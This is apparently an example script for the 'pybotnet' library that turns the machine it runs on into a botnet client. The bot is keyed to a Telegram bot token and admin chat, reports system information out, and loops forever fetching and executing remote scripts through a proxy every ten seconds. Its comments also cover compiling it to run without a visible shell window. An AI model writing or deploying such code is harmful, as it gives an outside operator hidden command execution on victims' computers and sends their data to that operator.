from pybotnet import pybotnet
import time


# ! rename configs.py.sample to configs.py
# ! and edit configs.py data
from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID

# * if you compile code without shell: is_sheel=False
# * show_log: just for debugging
# * send_system_data: send system short info in bot messages

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                        show_log=True, send_system_data=True, is_shell=True)

delay = 10

while True:
    print('*-*'*15)
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)
